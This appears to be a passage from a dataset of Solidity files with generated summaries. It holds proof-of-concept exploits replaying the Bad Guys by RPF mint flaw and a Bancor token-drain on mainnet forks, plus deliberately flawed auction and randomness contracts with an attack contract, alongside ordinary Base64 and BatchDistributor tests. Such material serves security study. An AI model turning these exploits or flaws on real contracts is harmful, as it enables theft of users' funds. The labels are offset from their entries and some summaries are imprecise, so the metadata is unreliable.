        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nBad Guys by RPF Business Logic Flaw Exploit PoC\n\nThe exploit was due to the missing check for \"chosenAmount\" in the WhiteListMint function which allowed the attacker to pass the number of NFTs he/she wanted to mint.\n\nTo understand more about NFT Merkle Proof - https://www.youtube.com/watch?v=67vkL8XkoJ0\n\nEtherscan tx - https://etherscan.io/tx/0xb613c68b00c532fe9b28a50a91c021d61a98d907d0217ab9b44cd8d6ae441d9f\n\nforge test --contracts ./src/test/BadGuysbyRPF_exp.sol -vv\n*/\n\ncontract BadGuysbyRPFExploit is DSTest {\n    \n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n\n    address owner = 0x09eFF2449882F9e727A8e9498787f8ff81465Ade; //owner of Bad Guys by RPF\n    address attacker = 0xBD8A137E79C90063cd5C0DB3Dbabd5CA2eC7e83e;\n  \n    IBadGuysRPFERC721 RPFContract = IBadGuysRPFERC721(0xB84CBAF116eb90fD445Dd5AeAdfab3e807D2CBaC);\n    bytes32[] merkleTree;\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 15460093); //fork mainnet at 15460093 \n\n        // There should be an easier way to do this \n        // I tried passing it as whole array but did not work\n        merkleTree.push(0xa3299324d1c59598e0dfa68de8d8c03d7492d88f6068cdd633a74eb9212e19e5);\n        merkleTree.push(0x5dcd197f362a82daaf56545974db26aabfe335be4c7eef015d3d74ccea4bf511);\n        merkleTree.push(0x18d716ad7f5113fe53b24a30288c6989dd04e6ad881be58b482d8d58f71c42da);\n        merkleTree.push(0x97a98e092a76c15cef3709df2776cf974e2519231e79c9ad97c15a1835c5c4be);\n        merkleTree.push(0x171696d6231b4a201927b35fe2dae4b91cefb62bef849a143560ebbb49cee5df);\n        merkleTree.push(0xe89305151bbec931414ab9693bf886cf3b96dba00ca338b1c0aaae911b6dff35);\n        merkleTree.push(0x69691b91227fa34a7a9a691d355fd6c466370928ddf3d50a347e894970f10079);\n        merkleTree.push(0x78299a273b7d50bcb1d75df1694be463b9cc66c6520026b785615c4594dbb1ba);\n        merkleTree.push(0xb297db4d926f0ebc26e098afcefa63d1d86d2e047ecbc36357192ef5240ea0ea);\n        merkleTree.push(0xb875ced562ca82ce114152c899bbd085d230a17be452243fda43bf995774243e);\n        merkleTree.push(0xd284a1831379548ff6bb0b5ad75ce8d0d1fea1cdc7b40b5f8d2e2307c9eda32c);\n        merkleTree.push(0x7eff30a405cfce9989fe9d71e346d7b3616fa69b8251782898226268818f63fb);\n        merkleTree.push(0x651ec4246f6e842692770a6ebd63396b4d62b52a3406522a02f182b8a16ba48c);\n        merkleTree.push(0xee17656e8a839ac096dd5905744ada01278fc49b978260e9e3ddd92223cc18d7);\n        merkleTree.push(0xce5c61c22a5d840c02b32aaebf73c9bc3c3d71c49f22b22c4f3cae4aa1fd557b);\n    }\n\n    function testExploit() public {\n        \n        //quick hack to enable Minting in Block#15460093\n        //In actual hack the Mint was live in Block#15460094\n        cheats.prank(owner);\n        RPFContract.flipPauseMinting();\n\n        console.log(\"[Before WhiteListMint] Attacker's Bad Guys by RPF NFT Balance: \", RPFContract.balanceOf(attacker));\n\n        cheats.prank(attacker);\n        RPFContract.WhiteListMint(merkleTree, 400); //mint 400 Bad Guys by RPF \n\n        console.log(\"[After WhiteListMint]  Attacker's Bad Guys by RPF NFT Balance: \", RPFContract.balanceOf(attacker));\n    }\n}",
        "summary": "This code is an implementation of an exploit for a specific vulnerability found in the code of a smart contract called \"Bad Guys by RPF\". The vulnerability allowed an attacker to mint any number of NFTs by bypassing a check in the \"WhiteListMint\" function. The exploit uses a fork of the mainnet to enable minting and then calls the \"WhiteListMint\" function with a merkle tree proof and the desired number of NFTs to mint.",
        "id": "d193c219-0532-43a5-b093-b7f8056069fa",
        "api_seq": "BadPushExample"
    },
    {
        "code": "// This code contains deliberate errors. Do not use.\n\npragma solidity ^0.4.21;\n\ncontract BadAuction {\n\n    address highestBidder;\n    uint highestBid;\n\n    function bid() public payable {\n        require(msg.value >= highestBid);\n\n        if (highestBidder != 0) {\n            highestBidder.transfer(highestBid);\n        }\n\n        highestBidder = msg.sender;\n        highestBid = msg.value;\n    }\n}\n",
        "summary": "The code is an incomplete implementation of an auction contract. It declares a contract that manages bids and assigns the highest bidder to a variable. When a new bid is submitted, the contract checks if the bidder has offered a higher value than the current highest bid. If they have, the new bid is accepted, and the value and bidder are assigned to the contract. The existing highest bidder is refunded. However, this code is not safe to use as it contains deliberate errors.",
        "id": "207404f3-85c6-47c2-b8b0-c55bd9752b9e",
        "api_seq": "BadRandomness"
    },
    {
        "code": "// SPDX-License-Identifier: MIT\n// By 0xAA\npragma solidity ^0.8.4;\nimport \"../34_ERC721/ERC721.sol\";\n\ncontract BadRandomness is ERC721 {\n    uint256 totalSupply;\n\n    // \u6784\u9020\u51fd\u6570\uff0c\u521d\u59cb\u5316NFT\u5408\u96c6\u7684\u540d\u79f0\u3001\u4ee3\u53f7\n    constructor() ERC721(\"\", \"\"){}\n\n    // \u94f8\u9020\u51fd\u6570\uff1a\u5f53\u8f93\u5165\u7684 luckyNumber \u7b49\u4e8e\u968f\u673a\u6570\u65f6\u624d\u80fdmint\n    function luckyMint(uint256 luckyNumber) external {\n        uint256 randomNumber = uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))) % 100; // get bad random number\n        require(randomNumber == luckyNumber, \"Better luck next time!\");\n\n        _mint(msg.sender, totalSupply); // mint\n        totalSupply++;\n    }\n}\n\ncontract Attack {\n    function attackMint(BadRandomness nftAddr) external {\n        // \u63d0\u524d\u8ba1\u7b97\u968f\u673a\u6570\n        uint256 luckyNumber = uint256(\n            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))\n        ) % 100;\n        // \u5229\u7528 luckyNumber \u653b\u51fb\n        nftAddr.luckyMint(luckyNumber);\n    }\n}\n",
        "summary": "This code includes two smart contracts: \n\n1. BadRandomness: This contract is an ERC721 non-fungible token (NFT) contract that has a function called luckyMint. To get a chance to mint a new NFT, the luckyMint function should be called with an input parameter called \"luckyNumber\". The NFT will be minted only if the internally generated random number in the contract equals the luckyNumber input parameter.\n\n2. Attack: This contract has a function that takes an instance of the BadRandomness contract. The function calculates a random number and calls the luckyMint function in the BadRandomness contract with the calculated number. This is an attack as the Attack contract can bypass the required luckyNumber parameter in the luckyMint function and mint an NFT by simply guessing the right random number.",
        "id": "bd38c0a6-6b01-408f-8709-77093f8ab546",
        "api_seq": "Bancor_exp"
    },
    {
        "code": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.10;\n\nimport \"forge-std/Test.sol\";\nimport \"./interface.sol\";\n\n/*\nBancor Protocol Access Control Exploit PoC\n\nSome of the newly deployed Bancor contracts had the 'safeTransferFrom' function public.\n\nAs a result, if any user had granted approval to these contracts was vulnerable.\n\nThe attacker can check if an user had granted an allowance to Bancor Contracts to transfer the ERC20 token \n\nExample tx - https://etherscan.io/tx/0x4643b63dcbfc385b8ab8c86cbc46da18c2e43d277de3e5bc3b4516d3c0fdeb9f\n\n*/\n\ninterface IBancor {\n   function safeTransferFrom(IERC20 _token, address _from, address _to, uint256 _value) external;\n}\n\ncontract BancorExploit is DSTest {\n    \n    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);\n    address bancorAddress = 0x5f58058C0eC971492166763c8C22632B583F667f;\n    address victim = 0xfd0B4DAa7bA535741E6B5Ba28Cba24F9a816E67E;\n    address attacker = address(this);\n    IERC20 XBPToken = IERC20(0x28dee01D53FED0Edf5f6E310BF8Ef9311513Ae40);\n    \n    IBancor bancorContract = IBancor(bancorAddress);\n\n    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 10307563); // fork mainnet at 10307563 \n    }\n\n    function testsafeTransfer() public {\n        emit log_named_uint(\"Victim XBPToken Allowance to Bancor Contract : \",(XBPToken.allowance(victim, bancorAddress) / 1 ether));\n        emit log_named_uint(\"[Before Attack]Victim XBPToken Balance : \",(XBPToken.balanceOf(victim)) / 1 ether);\n        emit log_named_uint(\"[Before Attack]Attacker XBPToken Balance : \",(XBPToken.balanceOf(attacker)) / 1 ether);\n\n        cheats.prank(address(this));\n        bancorContract.safeTransferFrom(\n            IERC20(address(XBPToken)),\n            victim,\n            attacker,\n            XBPToken.balanceOf(victim)//905987977635678910008152\n        );\n        emit log_string(\"--------------------------------------------------------------\");\n        emit log_named_uint(\"[After Attack]Victim XBPToken Balance : \",(XBPToken.balanceOf(victim)) / 1 ether);\n        emit log_named_uint(\"[After Attack]Attacker XBPToken Balance : \",(XBPToken.balanceOf(attacker)) / 1 ether);\n        \n    }\n\n}",
        "summary": "This is a Solidity smart contract that demonstrates an exploit in the Bancor Protocol that allows an attacker to transfer ERC20 tokens to themselves at the expense of a victim with approved allowance to the Bancor Protocol contracts. The contract imports an interface for Bancor and creates an instance of the contract to call the \"safeTransferFrom\" function with the parameters for the victim's address, the attacker's address, and the token balance of the victim. The contract also logs the balances of the victim and attacker before and after the attack.",
        "id": "1e073b18-038c-4ec9-9ea7-17765501500d",
        "api_seq": "Base64.t"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\nimport {PRBTest} from \"prb/test/PRBTest.sol\";\nimport {VyperDeployer} from \"utils/VyperDeployer.sol\";\n\nimport {BytesLib} from \"solidity-bytes-utils/BytesLib.sol\";\n\nimport {IBase64} from \"./interfaces/IBase64.sol\";\n\n/**\n * @dev We make use of Paul's testing assertions (https://github.com/paulrberg/prb-test)\n * in this test suite since it supports natively equality assertions for arrays.\n */\ncontract Base64Test is PRBTest {\n    using BytesLib for bytes;\n\n    VyperDeployer private vyperDeployer = new VyperDeployer();\n\n    IBase64 private base64;\n\n    function setUp() public {\n        base64 = IBase64(vyperDeployer.deployContract(\"src/utils/\", \"Base64\"));\n    }\n\n    function testEncodeEmptyString() public {\n        string[] memory emptyArray = new string[](0);\n        string[] memory outputStd = base64.encode(\"\", false);\n        string[] memory outputUrl = base64.encode(\"\", true);\n        assertEq(outputStd, emptyArray);\n        assertEq(outputUrl, emptyArray);\n    }\n\n    function testEncodeWithNoPadding() public {\n        string memory data = \"test12\";\n        string[] memory encoded = new string[](2);\n        encoded[0] = \"dGVz\";\n        encoded[1] = \"dDEy\";\n        string[] memory outputStd = base64.encode(bytes(data), false);\n        string[] memory outputUrl = base64.encode(bytes(data), true);\n        assertEq(outputStd, encoded);\n        assertEq(outputUrl, encoded);\n    }\n\n    function testEncodeWithSinglePadding() public {\n        string memory data = \"test1\";\n        string[] memory encoded = new string[](2);\n        encoded[0] = \"dGVz\";\n        encoded[1] = \"dDE=\";\n        string[] memory outputStd = base64.encode(bytes(data), false);\n        string[] memory outputUrl = base64.encode(bytes(data), true);\n        assertEq(outputStd, encoded);\n        assertEq(outputUrl, encoded);\n    }\n\n    function testEncodeWithDoublePadding() public {\n        string memory data = \"test\";\n        string[] memory encoded = new string[](2);\n        encoded[0] = \"dGVz\";\n        encoded[1] = \"dA==\";\n        string[] memory outputStd = base64.encode(bytes(data), false);\n        string[] memory outputUrl = base64.encode(bytes(data), true);\n        assertEq(outputStd, encoded);\n        assertEq(outputUrl, encoded);\n    }\n\n    function testEncodeSingleCharacter() public {\n        string memory data = \"M\";\n        string[] memory encoded = new string[](1);\n        encoded[0] = \"TQ==\";\n        string[] memory outputStd = base64.encode(bytes(data), false);\n        string[] memory outputUrl = base64.encode(bytes(data), true);\n        assertEq(outputStd, encoded);\n        assertEq(outputUrl, encoded);\n    }\n\n    function testEncodeSentence() public {\n        string memory data = \"Snakes are great animals!\";\n        string[] memory encoded = new string[](9);\n        encoded[0] = \"U25h\";\n        encoded[1] = \"a2Vz\";\n        encoded[2] = \"IGFy\";\n        encoded[3] = \"ZSBn\";\n        encoded[4] = \"cmVh\";\n        encoded[5] = \"dCBh\";\n        encoded[6] = \"bmlt\";\n        encoded[7] = \"YWxz\";\n        encoded[8] = \"IQ==\";\n        string[] memory outputStd = base64.encode(bytes(data), false);\n        string[] memory outputUrl = base64.encode(bytes(data), true);\n        assertEq(outputStd, encoded);\n        assertEq(outputUrl, encoded);\n    }\n\n    function testEncodeSafeUrl() public {\n        string memory data = \"[]c!~?[]~~\";\n        string[] memory encodedStd = new string[](4);\n        string[] memory encodedUrl = new string[](4);\n        encodedStd[0] = \"W11j\";\n        encodedStd[1] = \"IX4/\";\n        encodedStd[2] = \"W11+\";\n        encodedStd[3] = \"fg==\";\n        encodedUrl[0] = \"W11j\";\n        encodedUrl[1] = \"IX4_\";\n        encodedUrl[2] = \"W11-\";\n        encodedUrl[3] = \"fg==\";\n        string[] memory outputStd = base64.encode(bytes(data), false);\n        string[] memory outputUrl = base64.encode(bytes(data), true);\n        assertEq(outputStd, encodedStd);\n        assertEq(outputUrl, encodedUrl);\n    }\n\n    function testDecodeEmptyString() public {\n        bytes[] memory outputStd = base64.decode(\"\", false);\n        bytes[] memory outputUrl = base64.decode(\"\", true);\n        assertEq(outputStd.length, 0);\n        assertEq(outputUrl.length, 0);\n    }\n\n    function testDecodeWithNoPadding() public {\n        string memory text = \"test12\";\n        string memory data = \"dGVzdDEy\";\n        bytes[] memory outputStd = base64.decode(data, false);\n        bytes[] memory outputUrl = base64.decode(data, true);\n        assertEq(string(bytes.concat(outputStd[0], outputStd[1])), text);\n        assertEq(string(bytes.concat(outputUrl[0], outputUrl[1])), text);\n    }\n\n    function testDecodeWithSinglePadding() public {\n        string memory text = \"test1\";\n        string memory data = \"dGVzdDE=\";\n        bytes[] memory outputStd = base64.decode(data, false);\n        bytes[] memory outputUrl = base64.decode(data, true);\n        bytes memory returnDataStd = bytes.concat(outputStd[0], outputStd[1]);\n        bytes memory returnDataUrl = bytes.concat(outputUrl[0], outputUrl[1]);\n        /**\n         * @dev We remove the one trailing zero byte that stems from\n         * the padding to ensure byte-level equality.\n         */\n        assertEq(\n            string(returnDataStd.slice(0, returnDataStd.length - 1)),\n            text\n        );\n        assertEq(\n            string(returnDataUrl.slice(0, returnDataUrl.length - 1)),\n            text\n        );\n    }\n\n    function testDecodeWithDoublePadding() public {\n        string memory text = \"test\";\n        string memory data = \"dGVzdA==\";\n        bytes[] memory outputStd = base64.decode(data, false);\n        bytes[] memory outputUrl = base64.decode(data, true);\n        bytes memory returnDataStd = bytes.concat(outputStd[0], outputStd[1]);\n        bytes memory returnDataUrl = bytes.concat(outputUrl[0], outputUrl[1]);\n        /**\n         * @dev We remove the two trailing zero bytes that stem from\n         * the padding to ensure byte-level equality.\n         */\n        assertEq(\n            string(returnDataStd.slice(0, returnDataStd.length - 2)),\n            text\n        );\n        assertEq(\n            string(returnDataUrl.slice(0, returnDataUrl.length - 2)),\n            text\n        );\n    }\n\n    function testDecodeSingleCharacter() public {\n        string memory text = \"M\";\n        string memory data = \"TQ==\";\n        bytes[] memory outputStd = base64.decode(data, false);\n        bytes[] memory outputUrl = base64.decode(data, true);\n        /**\n         * @dev We remove the two trailing zero bytes that stem from\n         * the padding to ensure byte-level equality.\n         */\n        assertEq(string(outputStd[0].slice(0, outputStd[0].length - 2)), text);\n        assertEq(string(outputUrl[0].slice(0, outputUrl[0].length - 2)), text);\n    }\n\n    function testDecodeSentence() public {\n        string memory text = \"Snakes are great animals!\";\n        string memory data = \"U25ha2VzIGFyZSBncmVhdCBhbmltYWxzIQ==\";\n        bytes[] memory outputStd = base64.decode(data, false);\n        bytes[] memory outputUrl = base64.decode(data, true);\n        bytes memory returnDataStd = bytes.concat(\n            outputStd[0],\n            outputStd[1],\n            outputStd[2],\n            outputStd[3],\n            outputStd[4],\n            outputStd[5],\n            outputStd[6],\n            outputStd[7],\n            outputStd[8]\n        );\n        bytes memory returnDataUrl = bytes.concat(\n            outputUrl[0],\n            outputUrl[1],\n            outputUrl[2],\n            outputUrl[3],\n            outputUrl[4],\n            outputUrl[5],\n            outputUrl[6],\n            outputUrl[7],\n            outputUrl[8]\n        );\n        /**\n         * @dev We remove the two trailing zero bytes that stem from\n         * the padding to ensure byte-level equality.\n         */\n        assertEq(\n            string(returnDataStd.slice(0, returnDataStd.length - 2)),\n            text\n        );\n        assertEq(\n            string(returnDataUrl.slice(0, returnDataUrl.length - 2)),\n            text\n        );\n    }\n\n    function testDecodeSafeUrl() public {\n        string memory text = \"[]c!~?[]~\";\n        string memory data = \"W11jIX4_W11-\";\n        vm.expectRevert(bytes(\"Base64: invalid string\"));\n        base64.decode(data, false);\n        bytes[] memory outputUrl = base64.decode(data, true);\n        bytes memory returnDataUrl = bytes.concat(\n            outputUrl[0],\n            outputUrl[1],\n            outputUrl[2]\n        );\n        assertEq(string(returnDataUrl), text);\n    }\n\n    function testDataLengthMismatch() public {\n        string memory data = \"W11jI\";\n        vm.expectRevert(bytes(\"Base64: length mismatch\"));\n        base64.decode(data, false);\n        vm.expectRevert(bytes(\"Base64: length mismatch\"));\n        base64.decode(data, true);\n    }\n}\n",
        "summary": "This is a test suite for a Base64 encoding and decoding smart contract. It imports the necessary contracts and libraries and performs a series of tests to ensure that encoding and decoding of various types of data work correctly, including empty strings, strings with varying lengths, single characters, and sentences. It also tests that the Base64-encoded output is in compliance with SafeUrl encoding standards. If any of the tests fail, the transaction is reverted.",
        "id": "1e6091f3-6deb-45d1-af3b-4358bb0f9f85",
        "api_seq": "BatchDistributor.t"
    },
    {
        "code": "// SPDX-License-Identifier: WTFPL\npragma solidity ^0.8.19;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {VyperDeployer} from \"utils/VyperDeployer.sol\";\n\nimport {ERC20Mock} from \"./mocks/ERC20Mock.sol\";\n\nimport {IBatchDistributor} from \"./interfaces/IBatchDistributor.sol\";\n\ncontract BatchDistributorTest is Test {\n    VyperDeployer private vyperDeployer = new VyperDeployer();\n\n    IBatchDistributor private batchDistributor;\n\n    address private zeroAddress = address(0);\n\n    function setUp() public {\n        batchDistributor = IBatchDistributor(\n            vyperDeployer.deployContract(\"src/utils/\", \"BatchDistributor\")\n        );\n    }\n\n    function testDistributeEtherOneAddressSuccess() public {\n        address alice = makeAddr(\"alice\");\n        IBatchDistributor.Transaction[]\n            memory transaction = new IBatchDistributor.Transaction[](1);\n        transaction[0] = IBatchDistributor.Transaction({\n            recipient: alice,\n            amount: 2 wei\n        });\n        IBatchDistributor.Batch memory batch = IBatchDistributor.Batch({\n            txns: transaction\n        });\n\n        batchDistributor.distribute_ether{value: 2 wei}(batch);\n        assertEq(alice.balance, 2 wei);\n        assertEq(address(batchDistributor).balance, 0);\n    }\n\n    function testDistributeEtherMultipleAddressesSuccess() public {\n        address alice = makeAddr(\"alice\");\n        address bob = makeAddr(\"bob\");\n        address carol = makeAddr(\"carol\");\n        IBatchDistributor.Transaction[]\n            memory transaction = new IBatchDistributor.Transaction[](3);\n        transaction[0] = IBatchDistributor.Transaction({\n            recipient: alice,\n            amount: 2 wei\n        });\n        transaction[1] = IBatchDistributor.Transaction({\n            recipient: bob,\n            amount: 100 wei\n        });\n        transaction[2] = IBatchDistributor.Transaction({\n            recipient: carol,\n            amount: 2000 wei\n        });\n        IBatchDistributor.Batch memory batch = IBatchDistributor.Batch({\n            txns: transaction\n        });\n\n        batchDistributor.distribute_ether{value: 2102 wei}(batch);\n        assertEq(alice.balance, 2 wei);\n        assertEq(bob.balance, 100 wei);\n        assertEq(carol.balance, 2000 wei);\n        assertEq(address(batchDistributor).balance, 0);\n    }\n\n    function testDistributeEtherSendsBackExcessiveEther() public {\n        address alice = makeAddr(\"alice\");\n        address bob = makeAddr(\"bob\");\n        address carol = makeAddr(\"carol\");\n        address msgSender = address(makeAddr(\"msgSender\"));\n        vm.deal(msgSender, 1 ether);\n        uint256 balance = msgSender.balance;\n        IBatchDistributor.Transaction[]\n            memory transaction = new IBatchDistributor.Transaction[](3);\n        transaction[0] = IBatchDistributor.Transaction({\n            recipient: alice,\n            amount: 2 wei\n        });\n        transaction[1] = IBatchDistributor.Transaction({\n            recipient: bob,\n            amount: 100 wei\n        });\n        transaction[2] = IBatchDistributor.Transaction({\n            recipient: carol,\n            amount: 2000 wei\n        });\n        IBatchDistributor.Batch memory batch = IBatchDistributor.Batch({\n            txns: transaction\n        });\n\n        vm.prank(msgSender);\n        batchDistributor.distribute_ether{value: 1 ether}(batch);\n        assertEq(alice.balance, 2 wei);\n        assertEq(bob.balance, 100 wei);\n        assertEq(carol.balance, 2000 wei);\n        assertEq(\n            msgSender.balance,\n            balance - alice.balance - bob.balance - carol.balance\n        );\n        assertEq(address(batchDistributor).balance, 0);\n    }\n\n    function testDistributeEtherRevertWithNoFallbackFunctionForReceipt()\n        public\n    {\n        address alice = address(batchDistributor);\n        address bob = makeAddr(\"bob\");\n        address carol = makeAddr(\"carol\");\n        IBatchDistributor.Transaction[]\n            memory transaction = new IBatchDistributor.Transaction[](3);\n        transaction[0] = IBatchDistributor.Transaction({\n            recipient: alice,\n            amount: 2 wei\n        });\n        transaction[1] = IBatchDistributor.Transaction({\n            recipient: bob,\n            amount: 100 wei\n        });\n        transaction[2] = IBatchDistributor.Transaction({\n            recipient: carol,\n            amount: 2000 wei\n        });\n        IBatchDistributor.Batch memory batch = IBatchDistributor.Batch({\n            txns: transaction\n        });\n\n        /**\n         * @dev The `BatchDistributor` contract does not have a `fallback` function\n         * and must revert if funds are sent there.\n         */\n        vm.expectRevert();\n        batchDistributor.distribute_ether{value: 2102 wei}(batch);\n        assertEq(address(batchDistributor).balance, 0);\n    }\n\n    function testDistributeEtherRevertWithNoFallbackFunctionForMsgSender()\n        public\n    {\n        address alice = makeAddr(\"alice\");\n        address bob = makeAddr(\"bob\");\n        address carol = makeAddr(\"carol\");\n        IBatchDistributor.Transaction[]\n            memory transaction = new IBatchDistributor.Transaction[](3);\n        transaction[0] = IBatchDistributor.Transaction({\n            recipient: alice,\n            amount: 2 wei\n        });\n        transaction[1] = IBatchDistributor.Transaction({\n            recipient: bob,\n            amount: 100 wei\n        });\n        transaction[2] = IBatchDistributor.Transaction({\n            recipient: carol,\n            amount: 2000 wei\n        });\n        IBatchDistributor.Batch memory batch = IBatchDistributor.Batch({\n            txns: transaction\n        });\n\n        /**\n         * @dev The `Test` contract does not have a `fallback` function and must\n         * revert if excessive funds are returned.\n         */\n        vm.expectRevert();\n        batchDistributor.distribute_ether{value: 1 ether}(batch);\n        assertEq(address(batchDistributor).balance, 0);\n    }\n\n    function testDistributeEtherRevertWithInsufficientFunds() public {\n        address alice = makeAddr(\"alice\");\n        address bob = makeAddr(\"bob\");\n        address carol = makeAddr(\"carol\");\n        IBatchDistributor.Transaction[]\n            memory transaction = new IBatchDistributor.Transaction[](3);\n        transaction[0] = IBatchDistributor.Transaction({\n            recipient: alice,\n            amount: 2 wei\n        });\n        transaction[1] = IBatchDistributor.Transaction({\n            recipient: bob,\n            amount: 100 wei\n        });\n        transaction[2] = IBatchDistributor.Transaction({\n            recipient: carol,\n            amount: 2000 wei\n        });\n        IBatchDistributor.Batch memory batch = IBatchDistributor.Batch({\n            txns: transaction\n        });\n\n        /**\n         * @dev Sends too little funds, which triggers an insufficient funds error.\n         */\n        vm.expectRevert();\n        batchDistributor.distribute_ether{value: 1 wei}(batch);\n        assertEq(address(batchDistributor).balance, 0);\n    }\n\n    function testDistributeTokenOneAddressSuccess() public {\n        string memory arg1 = \"MyToken\";\n        string memory arg2 = \"MTKN\";\n        address arg3 = makeAddr(\"initialAccount\");\n        uint256 arg4 = 100;\n        ERC20Mock erc20Mock = new ERC20Mock(arg1, arg2, arg3, arg4);\n        vm.startPrank(arg3);\n        erc20Mock.approve(address(batchDistributor), 30);\n\n        address alice = makeAddr(\"alice\");\n        IBatchDistributor.Transaction[]\n            memory transaction = new IBatchDistributor.Transaction[](1);\n        transaction[0] = IBatchDistributor.Transaction({\n            recipient: alice,\n            amount: 30\n        });\n        IBatchDistributor.Batch memory batch = IBatchDistributor.Batch({\n            txns: transaction\n        });\n\n        batchDistributor.distribute_token(erc20Mock, batch);\n        vm.stopPrank();\n        assertEq(erc20Mock.balanceOf(alice), 30);\n        assertEq(erc20Mock.balanceOf(address(batchDistributor)), 0);\n    }\n\n    function testDistributeTokenMultipleAddressesSuccess() public {\n        string memory arg1 = \"MyToken\";\n        string memory arg2 = \"MTKN\";\n        address arg3 = makeAddr(\"initialAccount\");\n        uint256 arg4 = 100;\n        ERC20Mock erc20Mock = new ERC20Mock(arg1, arg2, arg3, arg4);\n        vm.startPrank(arg3);\n        erc20Mock.approve(address(batchDistributor), 100);\n\n        address alice = makeAddr(\"alice\");\n        address bob = makeAddr(\"bob\");\n        address carol = makeAddr(\"carol\");\n        IBatchDistributor.Transaction[]\n            memory transaction = new IBatchDistributor.Transaction[](3);\n        transaction[0] = IBatchDistributor.Transaction({\n            recipient: alice,\n            amount: 30\n        });\n        transaction[1] = IBatchDistributor.Transaction({\n            recipient: bob,\n            amount: 20\n        });\n        transaction[2] = IBatchDistributor.Transaction({\n            recipient: carol,\n            amount: 50\n        });\n        IBatchDistributor.Batch memory batch = IBatchDistributor.Batch({\n            txns: transaction\n        });\n\n        batchDistributor.distribute_token(erc20Mock, batch);\n        vm.stopPrank();\n        assertEq(erc20Mock.balanceOf(alice), 30);\n        assertEq(erc20Mock.balanceOf(bob), 20);\n        assertEq(erc20Mock.balanceOf(carol), 50);\n        assertEq(erc20Mock.balanceOf(address(batchDistributor)), 0);\n    }\n\n    function testDistributeTokenRevertWithInsufficientAllowance() public {\n        string memory arg1 = \"MyToken\";\n        string memory arg2 = \"MTKN\";\n        address arg3 = makeAddr(\"initialAccount\");\n        uint256 arg4 = 100;\n        ERC20Mock erc20Mock = new ERC20Mock(arg1, arg2, arg3, arg4);\n        vm.startPrank(arg3);\n        erc20Mock.approve(address(batchDistributor), 99);\n\n        address alice = makeAddr(\"alice\");\n        address bob = makeAddr(\"bob\");\n        address carol = makeAddr(\"carol\");\n        IBatchDistributor.Transaction[]\n            memory transaction = new IBatchDistributor.Transaction[](3);\n        transaction[0] = IBatchDistributor.Transaction({\n            recipient: alice,\n            amount: 30\n        });\n        transaction[1] = IBatchDistributor.Transaction({\n            recipient: bob,\n            amount: 20\n        });\n        transaction[2] = IBatchDistributor.Transaction({\n            recipient: carol,\n            amount: 50\n        });\n        IBatchDistributor.Batch memory batch = IBatchDistributor.Batch({\n            txns: transaction\n        });\n\n        vm.expectRevert(bytes(\"ERC20: insufficient allowance\"));\n        batchDistributor.distribute_token(erc20Mock, batch);\n        assertEq(erc20Mock.balanceOf(address(batchDistributor)), 0);\n        vm.stopPrank();\n    }\n\n    function testDistributeTokenRevertWithInsufficientBalance() public {\n        string memory arg1 = \"MyToken\";\n        string memory arg2 = \"MTKN\";\n        address arg3 = makeAddr(\"initialAccount\");\n        uint256 arg4 = 100;\n        ERC20Mock erc20Mock = new ERC20Mock(arg1, arg2, arg3, arg4);\n        vm.startPrank(arg3);\n        erc20Mock.approve(address(batchDistributor), 120);\n\n        address alice = makeAddr(\"alice\");\n        address bob = makeAddr(\"bob\");\n        address carol = makeAddr(\"carol\");\n        IBatchDistributor.Transaction[]\n            memory transaction = new IBatchDistributor.Transaction[](3);\n        transaction[0] = IBatchDistributor.Transaction({\n            recipient: alice,\n            amount: 50\n        });\n        transaction[1] = IBatchDistributor.Transaction({\n            recipient: bob,\n            amount: 20\n        });\n        transaction[2] = IBatchDistributor.Transaction({\n            recipient: carol,\n            amount: 50\n        });\n        IBatchDistributor.Batch memory batch = IBatchDistributor.Batch({\n            txns: transaction\n        });\n\n        vm.expectRevert(bytes(\"ERC20: transfer amount exceeds balance\"));\n        batchDistributor.distribute_token(erc20Mock, batch);\n        assertEq(erc20Mock.balanceOf(address(batchDistributor)), 0);\n        vm.stopPrank();\n    }\n\n    function testFuzzDistributeEtherMultipleAddressesSuccess(\n        IBatchDistributor.Batch memory batch,\n        uint256 value\n    ) public {\n        value = bound(value, type(uint16).max, type(uint32).max);\n        vm.assume(batch.txns.length <= 50);\n        for (uint256 i; i < batch.txns.length; ++i) {\n            batch.txns[i].amount = bound(batch.txns[i].amount, 1, 100);\n            assumePayable(batch.txns[i].recipient);\n        }\n\n        uint256 valueAccumulator;\n        address msgSender = address(makeAddr(\"msgSender\"));\n        vm.deal(msgSender, value);\n        vm.prank(msgSender);\n        batchDistributor.distribute_ether{value: value}(batch);\n        for (uint256 i; i < batch.txns.length; ++i) {\n            valueAccumulator += batch.txns[i].amount;\n            assertGe(batch.txns[i].recipient.balance, batch.txns[i].amount);\n        }\n        assertGe(msgSender.balance, value - valueAccumulator);\n        assertEq(address(batchDistributor).balance, 0);\n    }\n\n    function testFuzzDistributeTokenMultipleAddressesSuccess(\n        IBatchDistributor.Batch memory batch,\n        address initialAccount,\n        uint256 initialAmount\n    ) public {\n        vm.assume(initialAccount != zeroAddress);\n        initialAmount = bound(\n            initialAmount,\n            type(uint16).max,\n            type(uint32).max\n        );\n        vm.assume(batch.txns.length <= 50);\n        for (uint256 i; i < batch.txns.length; ++i) {\n            batch.txns[i].amount = bound(batch.txns[i].amount, 1, 100);\n            vm.assume(\n                batch.txns[i].recipient != address(batchDistributor) &&\n                    batch.txns[i].recipient != zeroAddress\n            );\n        }\n\n        uint256 valueAccumulator;\n        string memory arg1 = \"MyToken\";\n        string memory arg2 = \"MTKN\";\n        ERC20Mock erc20Mock = new ERC20Mock(\n            arg1,\n            arg2,\n            initialAccount,\n            initialAmount\n        );\n        vm.startPrank(initialAccount);\n        erc20Mock.approve(address(batchDistributor), initialAmount);\n        batchDistributor.distribute_token(erc20Mock, batch);\n        vm.stopPrank();\n        for (uint256 i; i < batch.txns.length; ++i) {\n            valueAccumulator += 